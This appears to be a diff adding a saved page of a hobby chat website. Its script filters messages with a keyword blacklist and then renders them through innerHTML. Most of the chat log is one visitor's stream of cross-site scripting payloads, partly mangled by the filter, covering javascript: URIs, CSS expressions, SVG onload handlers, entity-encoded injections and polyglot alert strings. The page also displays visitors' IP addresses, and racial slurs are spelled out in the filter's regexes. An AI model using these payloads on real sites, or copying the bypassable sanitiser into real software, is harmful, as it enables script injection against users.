@@ -1,0 +1,1282 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <title>Welcome To My Web Site :)</title>
+  <script>
+    if ( window.history.replaceState ) { //prevent refresh n submit
+        window.history.replaceState( null, null, window.location.href );
+    }
+
+    var flip=0;
+    const gchat_arr=[];
+
+    function ViewOrder(o,f,w) {
+      var i;      
+      var chathere_txt=chathere.innerHTML;
+      if (o) {
+        const _arr=chathere_txt.split("\$e\$");
+        const regex_ip_address=/\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/ig;
+        for (i=0;i<_arr.length;i++) {
+          var arr_str=_arr[i];
+          var ip_address=arr_str.match(regex_ip_address);
+          var href_ip_address="<a href='/global/"+ip_address+"'>"+ip_address+"</a>";
+          gchat_arr[i]=arr_str.replaceAll(ip_address,href_ip_address);
+        }
+      }
+      var _L=gchat_arr.length;
+      var txt="";
+      const _end="</button></form></h1></ul></iframe><br>";
+      //const _end="</button></form></h1></ul><br>";
+      if (w) {
+        for (i=1;i<_L;i++) {txt=txt+gchat_arr[_L-i-1]+_end;}
+      } else {
+        for (i=0;i<_L;i++) {txt=txt+gchat_arr[i]+_end;}
+      }
+      if (f) {flip=!w;}
+      chathere.innerHTML=txt;
+    }
+
+    //call on load
+    window.addEventListener("load", function()
+    {
+      var chathere=document.getElementById("chathere");
+      var chathere_txt=chathere.innerHTML;
+      var timeDisplay=document.getElementById("time");
+
+      //DISPLAY LIVE TIME
+      LiveTime=function() {
+        var local_tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+        var dateStringLocal = new Date().toLocaleString("en-US", {timeZone: local_tz});
+        var dateStringUTC = new Date().toLocaleString("en-US", {timeZone: "UTC"});
+        var s1 = dateStringLocal.replace(", ", " / ");
+        var s2 = dateStringUTC.replace(", ", " / ");
+        var timeTxt = "Your Time Now Is: "+s1+"<br> UTC Time Now Is: "+s2;
+        timeDisplay.innerHTML=timeTxt;
+      }
+
+      //Function to Update Chat
+      UpdateChat= function() {
+        //const regex = /\$e\$/g;
+        var i;
+        chathere.innerHTML="";
+        req = new XMLHttpRequest();
+        req.onreadystatechange = function() {
+          if (this.readyState==4 && this.status==200) {
+            var _t = String(this.responseText)
+
+            chathere.textContent=_t;
+            _t = chathere.textContent;
+
+            _t = _t.replaceAll("d;v","X_x");
+            _t = _t.replaceAll("div","d;v");
+
+            const regex_table=/[Tt][Aa][Bb][Ll][Ee]/ig;
+            _t = _t.replaceAll(regex_table,"t@ble");
+
+            const regex_php=/[Pp][Hh][Pp]/ig;
+            _t = _t.replaceAll(regex_php,")hp");
+
+            const regex_body=/[Bb][Oo][Dd][Yy]/ig;
+            _t = _t.replaceAll(regex_body,"bod¥");
+            
+            const regex_document=/[dD][oO][cC][uU]/ig;
+            _t = _t.replaceAll(regex_document,"d0cu");
+           
+            const regex_script=/[Ss][Cc][Rr][Ii][Pp][Tt]/ig;
+            _t = _t.replaceAll(regex_script,"$cript");
+
+            const regex_gamer=/[Nn][Ii][Gg]{2}[Ee][Rr]/ig;
+            _t = _t.replaceAll(regex_gamer,"Nigeria");
+
+            const regex_gamer2=/[Nn][Ii][Gg]{2}[Aa]/ig;
+            _t = _t.replaceAll(regex_gamer2,"mooncake");
+
+            const regex_xss=/[Xx][Ss]{2}/ig;
+            _t = _t.replaceAll(regex_xss,"X_x");
+
+            const regex_svg=/[Ss][Vv][Gg]/ig
+            _t = _t.replaceAll(regex_svg,"$vg");
+
+            const regex_title=/[Tt][Ii][Tt][Ll][Ee]/ig
+            _t = _t.replaceAll(regex_title,"t1tl3");
+            
+            const regex_alert=/[Aa][Ll][Ee][Rr][Tt]/ig
+            _t = _t.replaceAll(regex_alert,"@lert");
+
+            const regex_java=/[jJ][Aa][Vv][Aa]/ig
+            _t = _t.replaceAll(regex_java,"j@va");
+
+            const regex_data=/[dD][Aa][Tt][Aa]/ig
+            _t = _t.replaceAll(regex_data,"d@ta");
+
+            const regex_marquee=/[Mm][Aa][Rr][Qq][Uu][Ee]{2}/ig
+            _t = _t.replaceAll(regex_marquee,"m@rquee");
+
+            const regex_cookie=/[Cc][Oo]{2}[Kk][Ii][Ee]/ig
+            _t = _t.replaceAll(regex_cookie,"c00kie");
+
+            const regex_onerror=/[Oo][Nn][Ee][Rr]{2}[Oo][Rr]/ig
+            _t = _t.replaceAll(regex_onerror,"0n3rr0r");
+
+            const regex_onload=/[Oo][Nn][Ll][Oo][Aa]/ig;
+            _t = _t.replaceAll(regex_onload,"0nl0a");
+
+            const regex_onproperty=/[Oo][Nn][Pp][Rr][Oo][Pp][Ee][Rr][Tt][Yy]/ig
+            _t = _t.replaceAll(regex_onproperty,"0npr0perty");
+
+            const regex_xml=/[Xx][Mm][Ll]/ig
+            _t = _t.replaceAll(regex_xml,"X_x");
+
+            const regex_form=/[Ff][Oo][Rr][Mm]/ig
+            _t = _t.replaceAll(regex_form,"f0rm");
+
+            const regex_xlink=/[xX][Ll][Ii][Nn][Kk]/ig
+            _t = _t.replaceAll(regex_xlink,"xl1nk_");
+
+            const regex_window=/[Ww][Ii][Nn][Dd][Oo][Ww]/ig
+            _t = _t.replaceAll(regex_window,"w1ndow");
+
+            const regex_statechange=/[Ss][Tt][Aa][Tt][Ee][Cc][Hh][Aa][Nn][Gg][Ee]/ig
+            _t = _t.replaceAll(regex_statechange,"_st@techange");
+
+            const regex_hidden=/[Hh][Ii][Dd][Dd][Ee][Nn]/ig
+            _t = _t.replaceAll(regex_hidden,"h1dden");
+
+            const regex_vulnerable=/[Vv][Uu][Ll][Nn][Ee][Rr][Aa][Bb][Ll][Ee]/ig
+            _t = _t.replaceAll(regex_vulnerable,"vulner@bl3");
+
+            const regex_meta=/[mM][eE][Tt][Aa]/ig
+            _t = _t.replaceAll(regex_meta,"x3ta");
+
+            const regex_worksinie=/[wW][Oo][rR][Kk][Ss][Ii][Nn][Ii][Ee]/ig
+            _t = _t.replaceAll(regex_worksinie,"w0rksin1e");
+
+            const regex_ifphp=/[iI][fF][rR][aA][M][eE][pP][Hh][pP]/ig
+            _t = _t.replaceAll(regex_ifphp,"1fr4mephp");
+
+            const regex_button=/[Bb][Uu][Tt]{2}[Oo][Nn]/ig
+            _t = _t.replaceAll(regex_button,"butt0n");
+
+            const regex_confirm=/[Cc][Oo][Nn][Ff][Ii][Rr][Mm]/ig
+            _t = _t.replaceAll(regex_confirm,"c0nfirm");
+
+            const regex_prompt=/[Pp][Rr][Oo][Mm][Pp][Tt]/ig
+            _t = _t.replaceAll(regex_prompt,"pr0mpt");
+
+            const regex_object=/[Oo][Bb][Jj][Ee][Cc][Tt]/ig
+            _t = _t.replaceAll(regex_object,"0bject");
+
+            _t = _t.replaceAll("\/>","XD"); //This did the trick
+
+            _t = _t.replaceAll("\\u","XD");
+
+            _t = _t.replaceAll("\\U","XD");
+
+            _t = _t.replaceAll("\&\#","XD");
+
+            _t = _t.replaceAll("absolute","@bsolute");
+
+            //_t = _t.replaceAll("src","id");
+            //_t = _t.replaceAll("true","+rue");
+            _t = _t.replaceAll("CharCode","CharC0de");
+            _t = _t.replaceAll("base64","b64");
+            
+            chathere.innerHTML=_t;
+            ViewOrder(1,0,!flip);
+          }
+        };
+        req.open("GET","global/lechat001.txt",true);
+        req.send();
+      }
+
+      /*window.addEventListener('keydown', function (e) {
+        if (e.key==13) {
+          console.log(document.getElementById("txthere").value);
+        }
+      }, false);*/
+
+      setInterval(LiveTime, 1000); 
+      UpdateChat();
+      //ViewOrder(1,1,flip);
+    });
+  </script>
+  <style>
+    #chathere {
+      border:2px solid;
+      overflow-y: auto;
+      max-height: 480px;
+    }
+  </style>
+</head>
+
+<body>
+    <a href="http://60.242.253.123/global">|=[View Site Content]</a><a href="http://60.242.253.123/php/user_act_folder.php">|=|[Folder Actions]|=|</a><a href="http://60.242.253.123/global/60.242.253.123">|=|[Home]|=|</a>
+  <h1>Hello World!</h1>
+
+  Welcome to 60.242.253.123!<br>  <div id="time">Your Time Now Is: 1/29/2023 / 3:57:35 PM<br> UTC Time Now Is: 1/29/2023 / 7:57:35 AM</div>
+  Your IP is 60.242.253.123<br>  <p>Say Something or Hear from Others!  
+    <button onclick="UpdateChat()">Hear</button>
+    <button onclick="ViewOrder(0,1,flip)">Flip</button>
+  </p>
+  <form method="post" id="form1">
+    <textarea id="txthere" name="txthere" rows="8" cols="80" maxlength="9001"></textarea>
+    <br><input type="submit" name="submit" value="Submit">
+  </form>
+    <br>
+  <div id="chathere" height:400px;="" onload="window.alert = function() {};">
+<p></p><br>
+[2023/01/29 06:39:58][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> e<br></d;v>
+[2023/01/29 06:39:23][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <p><br>
+[2023/01/29 03:07:03][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> morning<br></d;v>
+[2023/01/29 03:06:46][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> testing<br></d;v>
+[2023/01/29 03:05:20][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> m<br></d;v>
+[2023/01/28 21:03:13][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> idk why<br></d;v>
+[2023/01/28 20:59:55][<a href="http://60.242.253.123/global//172.10.165.215">/172.10.165.215</a>]<d;v> 1 thing<br></d;v>
+[2023/01/28 20:58:03][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> where the fk is the 1 comming from<br></d;v>
+[2023/01/28 20:57:52][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> A$$<br></d;v>
+[2023/01/28 20:56:40][172.10.165.215]<d;v> Titty<br></d;v>
+[2023/01/28 20:54:49][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> Win7 when i hack him with big butt0n<img src="Welcome%20To%20My%20Web%20Site%20)_files/pp,504x498-pad,600x600,f8f8f8.jpg"><x_x><br></x_x></d;v>
+[2023/01/28 20:04:34][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> hmm<br></d;v>
+[2023/01/28 19:53:18][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/j@va$cript%20d0cument.vulner@bl3=true%3b" <br=""><iframe src="j@va$cript:d0cument.vulner@bl3=true; &lt;
+&lt;br&gt;&lt;$cript&gt;a=/X_x/\nd0cument.vulner@bl3=true;&lt;/$cript&gt;
+&lt;br&gt;\" ;d0cument.vulner@bl3="true;;//" <br="">&lt;/t1tl3&gt;&lt;$cript&gt;d0cument.vulner@bl3=true;&lt;/$cript&gt;
+&lt;br&gt;&lt;input TYPE="IMAGE" SRC="j@va$cript:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;bod¥ BACKGROUND="j@va$cript:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;bod¥ 0nl0aD=d0cument.vulner@bl3=true;&gt;
+&lt;br&gt;&lt;img DYNSRC="j@va$cript:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;img LOWSRC="j@va$cript:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;bgsound SRC="j@va$cript:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;br SIZE="&amp;{d0cument.vulner@bl3=true}"&gt;
+&lt;br&gt;&lt;LAYER SRC="j@va$cript:d0cument.vulner@bl3=true;"&gt;&lt;/LAYER&gt;
+&lt;br&gt;&lt;link REL="stylesheet" HREF="j@va$cript:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;style&gt;li {list-style-image: url("j@va$cript:d0cument.vulner@bl3=true;");&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;X_x
+&lt;br&gt;&lt;img SRC='vb$cript:d0cument.vulner@bl3=true;'&gt;
+&lt;br&gt;1$cript3d0cument.vulner@bl3=true;1/$cript3
+&lt;br&gt;&lt;x3ta HTTP-EQUIV="refresh" CONTENT="0;url=j@va$cript:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;x3ta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=j@va$cript:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;IFRAME SRC="j@va$cript:d0cument.vulner@bl3=true;"&gt;</iframe>
+<br>
+<br><t@ble background="j@va$cript:d0cument.vulner@bl3=true;">
+<br><t@ble>
+<br><d;v style="background-image: url(j@va$cript:d0cument.vulner@bl3=true;)">
+<br><d;v style="background-image: url(XD1;j@va$cript:d0cument.vulner@bl3=true;)">
+<br><d;v style="width: expression(d0cument.vulner@bl3=true);">
+<br><style>@im\port'\ja\vasc\ript:d0cument.vulner@bl3=true';</style>
+<br><img style="X_x:expr/*X_x*/ession(d0cument.vulner@bl3=true)">
+<br><x_x style="X_x:expression(d0cument.vulner@bl3=true)">
+<br>exp/*</x_x></d;v></d;v></d;v></t@ble></t@ble></d;v><a style="no\X_x:noX_x(&quot;*//*&quot;);X_x:ex/*X_x*//*/*/pression(d0cument.vulner@bl3=true)">
+<br><style type="text/j@va$cript">d0cument.vulner@bl3=true;</style>
+<br><style>.X_x{background-image:url("j@va$cript:d0cument.vulner@bl3=true");}</style></a><a class="X_x"></a>
+<br><style type="text/css">bod¥{background:url("j@va$cript:d0cument.vulner@bl3=true")}</style>
+<br><!--[if gte IE 4]><$cript>d0cument.vulner@bl3=true;</$cript><![endif]-->
+<br><!-- base href="http://60.242.253.123/j@va$cript:d0cument.vulner@bl3=true;//" -->
+<br>&lt;0bject classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;<param name="url" value="j@va$cript:d0cument.vulner@bl3=true"><!--0bject-->
+<br><x_x id="I"><x><c><!--[<IMG SRC="j@vas]]<![cript:d0cument.vulner@bl3=true;"-->]]</c></x></x_x><span d@tasrc="#I" d@tafld="C" d@taf0rmatas="HTML"></span>
+<br><x_x id="X_x"><i><b><img src="Welcome%20To%20My%20Web%20Site%20)_files/j@vas%20!--%20--%20cript%20d0cument.vulner@bl3=true"></b></i></x_x><span d@tasrc="#X_x" d@tafld="B" d@taf0rmatas="HTML"></span>
+<br><bod¥><!--?X_x:namespace prefix="t" ns="urn:schemas-microsoft-com:time"--><!--?import namespace="t" implementation="#default#time2"--><t:set attributename="innerHTML" to="X_x&lt;$cript DEFER&gt;d0cument.vulner@bl3=true&lt;/$cript&gt;"></t:set></bod¥>
+<br><!--? echo('<SCR)';echo('IPT-->d0cument.vulner@bl3=true<!--$cript-->'); ?&gt;
+<br><x3ta http-equiv="Set-c00kie" content="USERID=&lt;$cript&gt;d0cument.vulner@bl3=true&lt;/$cript&gt;">
+<br><x3ta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-7"> +ADw-$cript+AD4-d0cument.vulner@bl3=true;+ADw-/$cript+AD4-
+<br><a href="http://60.242.253.123/j@va$cript:d0cument.vulner@bl3=true;//j@va$cript#d0cument.vulner@bl3=true;">
+<br><d;v onmouseover="d0cument.vulner@bl3=true;">
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/j@va$cript%20d0cument.vulner@bl3=true%3b">
+<br><img dynsrc="j@va$cript:d0cument.vulner@bl3=true;">
+<br><input type="image" dynsrc="j@va$cript:d0cument.vulner@bl3=true;">
+<br><bgsound src="j@va$cript:d0cument.vulner@bl3=true;">
+<br>&amp;&lt;$cript&gt;d0cument.vulner@bl3=true;<!--$cript-->
+<br>&amp;{d0cument.vulner@bl3=true;};
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/&amp;%7Bd0cument.vulner@bl3=true%3b%7D%3b">
+<br><link rel="stylesheet" href="Welcome%20To%20My%20Web%20Site%20)_files/j@va$cript%20d0cument.vulner@bl3=true%3b">
+<br><iframe src="Welcome%20To%20My%20Web%20Site%20)_files/vbcriptd0cument.html">
+&lt;br&gt;&lt;img src="mocha:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;img src="live$cript:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;a href="about:&lt;$cript&gt;d0cument.vulner@bl3=true;&lt;/$cript&gt;"&gt;
+&lt;br&gt;&lt;x3ta http-equiv="refresh" content="0;url=j@va$cript:d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;bod¥ 0nl0ad="d0cument.vulner@bl3=true;"&gt;
+&lt;br&gt;&lt;d;v style="background-image: url(j@va$cript:d0cument.vulner@bl3=true;);"&gt;
+&lt;br&gt;&lt;d;v style="behaviour: url([link to code]);"&gt;
+&lt;br&gt;&lt;d;v style="binding: url([link to c
+&lt;br&gt;&lt;X_x&gt;&lt;/button&gt;&lt;/form&gt;&lt;/h1&gt;&lt;/ul&gt;</iframe><br></d;v>
+
+
+
+
+[2023/01/28 19:52:53][</a><a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> nice<br></d;v>
+
+
+
+
+
+
+
+
+
+[2023/01/28 19:52:19][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br>';@lert(String.fromCharC0de(88,83,83))//';@lert(String. 
+fromCharC0de(88,83,83))//";@lert(String.fromCharC0de 
+(88,83,83))//";@lert(String.fromCharC0de(88,83,83))//-- &gt;<!--$cript-->"&gt;'&gt;&lt;$cript&gt;@lert(String.fromCharC0de(88,83,83)) <!--$cript-->
+<br><x_x><br></x_x></d;v>
+
+
+
+
+
+
+
+[2023/01/28 19:50:48][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><name>
+<br>  <value><!--[Cd@ta[<$cript-->c0nfirm(d0cument.domain)<!--$cript-->]]&gt;</value>
+<br></name>
+<br><x_x><br></x_x></d;v>
+
+
+
+
+
+
+
+
+[2023/01/28 19:49:42][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><d;v onpointerover="@lert(45)">MOVE HERE</d;v>
+<br><d;v onpointerdown="@lert(45)">MOVE HERE</d;v>
+<br><d;v onpointerenter="@lert(45)">MOVE HERE</d;v>
+<br><d;v onpointerleave="@lert(45)">MOVE HERE</d;v>
+<br><d;v onpointermove="@lert(45)">MOVE HERE</d;v>
+<br><d;v onpointerout="@lert(45)">MOVE HERE</d;v>
+<br><d;v onpointerup="@lert(45)">MOVE HERE</d;v>
+<br><x_x><br></x_x></d;v>
+
+
+
+
+
+
+
+
+
+
+
+[2023/01/28 19:49:10][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br>&lt;$vg/0nl0ad=@lert('X_x')&gt;
+<br>&lt;$vg 0nl0ad=@lert(1)//
+<br>&lt;$vg/0nl0ad=@lert(String.fromCharC0de(88,83,83))&gt;
+<br>&lt;$vg id=@lert(1) 0nl0ad=eval(id)&gt;
+<br>"&gt;&lt;$vg/0nl0ad=@lert(String.fromCharC0de(88,83,83))&gt;
+<br>"&gt;&lt;$vg/0nl0ad=@lert(/X_x/)
+<br>&lt;$vg&gt;&lt;$cript href=d@ta:,@lert(1) XD(`Firefox` is the only browser which allows self closing $cript)
+<br><x_x><br></x_x></d;v>
+
+
+
+[2023/01/28 19:48:28][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br>&lt;$vg0nl0ad=XD106;XD97;XD118;XD97;XD115;XD99;XD114;XD105;XD112;XD116;XD58;XD100;XD111;XD99;XD117;XD109;XD101;XD110;XD116;XD46;XD103;XD101;XD116;XD69;XD108;XD101;XD109;XD101;XD110;XD116;XD115;XD66;XD121;XD84;XD97;XD103;XD78;XD97;XD109;XD101;XD40;XD34;XD112;XD34;XD41;XD91;XD48;XD93;XD46;XD105;XD110;XD110;XD101;XD114;XD72;XD84;XD77;XD76;XD32;XD43;XD61;XD32;XD39;XD60;XD115;XD116;XD121;XD108;XD101;XD32;XD99;XD111;XD110;XD116;XD101;XD110;XD116;XD101;XD100;XD105;XD116;XD97;XD98;XD108;XD101;XD32;XD115;XD116;XD121;XD108;XD101;XD61;XD34;XD100;XD105;XD115;XD112;XD108;XD97;XD121;XD58;XD32;XD98;XD108;XD111;XD99;XD107;XD59;XD32;XD119;XD104;XD105;XD116;XD101;XD45;XD115;XD112;XD97;XD99;XD101;XD58;XD32;XD112;XD114;XD101;XD59;XD99;XD111;XD108;XD111;XD114;XD58;XD114;XD101;XD100;XD59;XD34;XD32;XD62;XD104;XD116;XD109;XD108;XD32;XD32;XD123;XD32;XD92;XD110;XD47;XD42;XD32;XD116;XD117;XD114;XD116;XD108;XD44;XD32;XD89;XD111;XD117;XD32;XD99;XD97;XD110;XD32;XD101;XD100;XD105;XD116;XD32;XD116;XD104;XD101;XD109;XD101;XD32;XD108;XD105;XD118;XD101;XD32;XD58;XD41;XD32;XD42;XD47;XD32;XD92;XD110;XD32;XD99;XD111;XD108;XD111;XD114;XD58;XD32;XD100;XD97;XD114;XD107;XD103;XD114;XD101;XD101;XD110;XD59;XD32;XD92;XD110;XD125;XD60;XD47;XD115;XD116;XD121;XD108;XD101;XD62;XD39;&gt;
+<br><x_x><br></x_x></d;v>
+
+
+
+
+
+
+
+
+
+[2023/01/28 19:47:24][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><!--?)hp header("Content-Type: application/j@va$cript"); ?-->
+<br><x_x><br></x_x></d;v>
+[2023/01/28 19:45:47][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><iframe<?)hp echo="" chr(11)?=""> 0nl0ad=@lert('X_x')&gt;
+<br><x_x><br></x_x></iframe<?)hp></d;v>
+[2023/01/28 19:45:30][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <iframe src="Welcome%20To%20My%20Web%20Site%20)_files/a8MZBUoQt68.html" t1tl3="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" width="560" height="315" frameborder="0"></iframe><br></d;v>
+[2023/01/28 19:44:44][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> sad<br></d;v>
+[2023/01/28 19:43:27][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v>
+ &lt;X_x 
+onClick=\"X_xXD58;expression(XD106;XD97;XD118;XD97;XD115;XD99;XD114;XD105;XD112;XD116;XD58;XD100;XD111;XD99;XD117;XD109;XD101;XD110;XD116;XD46;XD103;XD101;XD116;XD69;XD108;XD101;XD109;XD101;XD110;XD116;XD115;XD66;XD121;XD84;XD97;XD103;XD78;XD97;XD109;XD101;XD40;XD34;XD112;XD34;XD41;XD91;XD48;XD93;XD46;XD105;XD110;XD110;XD101;XD114;XD72;XD84;XD77;XD76;XD32;XD43;XD61;XD32;XD39;XD60;XD115;XD116;XD121;XD108;XD101;XD32;XD99;XD111;XD110;XD116;XD101;XD110;XD116;XD101;XD100;XD105;XD116;XD97;XD98;XD108;XD101;XD32;XD115;XD116;XD121;XD108;XD101;XD61;XD34;XD100;XD105;XD115;XD112;XD108;XD97;XD121;XD58;XD32;XD98;XD108;XD111;XD99;XD107;XD59;XD32;XD119;XD104;XD105;XD116;XD101;XD45;XD115;XD112;XD97;XD99;XD101;XD58;XD32;XD112;XD114;XD101;XD59;XD99;XD111;XD108;XD111;XD114;XD58;XD114;XD101;XD100;XD59;XD34;XD32;XD62;XD104;XD116;XD109;XD108;XD32;XD32;XD123;XD32;XD92;XD110;XD47;XD42;XD32;XD116;XD117;XD114;XD116;XD108;XD44;XD32;XD89;XD111;XD117;XD32;XD99;XD97;XD110;XD32;XD101;XD100;XD105;XD116;XD32;XD116;XD104;XD101;XD109;XD101;XD32;XD108;XD105;XD118;XD101;XD32;XD58;XD41;XD32;XD42;XD47;XD32;XD92;XD110;XD32;XD99;XD111;XD108;XD111;XD114;XD58;XD32;XD100;XD97;XD114;XD107;XD103;XD114;XD101;XD101;XD110;XD59;XD32;XD92;XD110;XD125;XD60;XD47;XD115;XD116;XD121;XD108;XD101;XD62;XD39;)\"&gt;<br></d;v>
+[2023/01/28 19:43:01][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> not working<br></d;v>
+[2023/01/28 19:42:56][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> lol<br></d;v>
+[2023/01/28 19:42:21][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br>&lt;X_x 
+STYLE=\"X_xXD58;expression(XD106;XD97;XD118;XD97;XD115;XD99;XD114;XD105;XD112;XD116;XD58;XD100;XD111;XD99;XD117;XD109;XD101;XD110;XD116;XD46;XD103;XD101;XD116;XD69;XD108;XD101;XD109;XD101;XD110;XD116;XD115;XD66;XD121;XD84;XD97;XD103;XD78;XD97;XD109;XD101;XD40;XD34;XD112;XD34;XD41;XD91;XD48;XD93;XD46;XD105;XD110;XD110;XD101;XD114;XD72;XD84;XD77;XD76;XD32;XD43;XD61;XD32;XD39;XD60;XD115;XD116;XD121;XD108;XD101;XD32;XD99;XD111;XD110;XD116;XD101;XD110;XD116;XD101;XD100;XD105;XD116;XD97;XD98;XD108;XD101;XD32;XD115;XD116;XD121;XD108;XD101;XD61;XD34;XD100;XD105;XD115;XD112;XD108;XD97;XD121;XD58;XD32;XD98;XD108;XD111;XD99;XD107;XD59;XD32;XD119;XD104;XD105;XD116;XD101;XD45;XD115;XD112;XD97;XD99;XD101;XD58;XD32;XD112;XD114;XD101;XD59;XD99;XD111;XD108;XD111;XD114;XD58;XD114;XD101;XD100;XD59;XD34;XD32;XD62;XD104;XD116;XD109;XD108;XD32;XD32;XD123;XD32;XD92;XD110;XD47;XD42;XD32;XD116;XD117;XD114;XD116;XD108;XD44;XD32;XD89;XD111;XD117;XD32;XD99;XD97;XD110;XD32;XD101;XD100;XD105;XD116;XD32;XD116;XD104;XD101;XD109;XD101;XD32;XD108;XD105;XD118;XD101;XD32;XD58;XD41;XD32;XD42;XD47;XD32;XD92;XD110;XD32;XD99;XD111;XD108;XD111;XD114;XD58;XD32;XD100;XD97;XD114;XD107;XD103;XD114;XD101;XD101;XD110;XD59;XD32;XD92;XD110;XD125;XD60;XD47;XD115;XD116;XD121;XD108;XD101;XD62;XD39;)\"&gt;
+<br><x_x><br></x_x></d;v>
+
+
+
+
+
+
+
+
+
+
+[2023/01/28 19:41:17][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/XD106%253bXD97%253bXD118%253bXD97%253bXD115%253bXD99%253bXD114%253bXD_002.html">
+<br><x_x><br></x_x></d;v>
+[2023/01/28 19:40:44][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/%25E2%2580%259DXD106%253bXD97%253bXD118%253bXD97%253bXD115%253bXD99%253bXD114.html">
+<br><x_x><br></x_x></d;v>
+[2023/01/28 19:39:36][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/%25E2%2580%259DjavXDx09%253ba$cript%2520@lert(%25E2%2580%2598X_x%25E2%2580%2599)%25.html">
+<br><x_x><br></x_x></d;v>
+[2023/01/28 19:38:52][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><input type="h1dden" name="&lt;variable name here&gt;" value="&lt;value here&gt;" style="x:ex/**/pression(@lert" <br="">(54163)) ""&gt;
+<br><x_x><br></x_x></d;v>
+[2023/01/28 19:38:10][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><input type="h1dden" name="id" value="&lt;%=ESAPI.encoder().encodeForHTMLAttribute(id)%&gt;" <br=""><x_x><br></x_x></d;v>
+[2023/01/28 19:35:01][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br>‘;@lert(String.fromCharC0de(88,83,83))//’;@lert(String.fromCharC0de(88,83,83))//”;@lert(String.fromCharC0de(88,83,83))//”;@lert(String.fromCharC0de(88,83,83))//–&gt;<!--$cript-->”&gt;’&gt;&lt;$cript&gt;@lert(String.fromCharC0de(88,83,83))<!--$cript-->
+<br>
+<br><x_x><br></x_x></d;v>
+
+
+
+
+
+
+
+
+
+
+
+
+[2023/01/28 19:33:38][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br>"&gt;<img src="Welcome%20To%20My%20Web%20Site%20)_files/x.html" 0n3rr0r="w1ndow.open('https://www.google.com/');">
+<br><f0rm><butt0n f0rmaction="j@va$cript:@lert(1)">CLICKME
+<br><x_x><br></x_x></butt0n></f0rm></d;v>
+[2023/01/28 19:33:08][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><d;v onmouseover="@lert(1)"> style="x:"&gt;
+<br>&lt;--`<img src="Welcome%20To%20My%20Web%20Site%20)_files/%60.html" 0n3rr0r="@lert(1)"> --!&gt;
+<br> 
+&lt;$cript/src=XD100XD97XD116XD97:text/XDx6aXDx61XDx76XDx61XDx73XDx63XDx72XDx69XDx000070XDx074,XDx0061;XDx06c;XDx0065;XDx00000072;XDx00074;(1)&gt;<!--$cript-->
+<br><d;v style="xg-p:@bsolute;top:0;left:0;width:100%;height:100%" onmouseover="pr0mpt(1)" onclick="@lert(1)">x
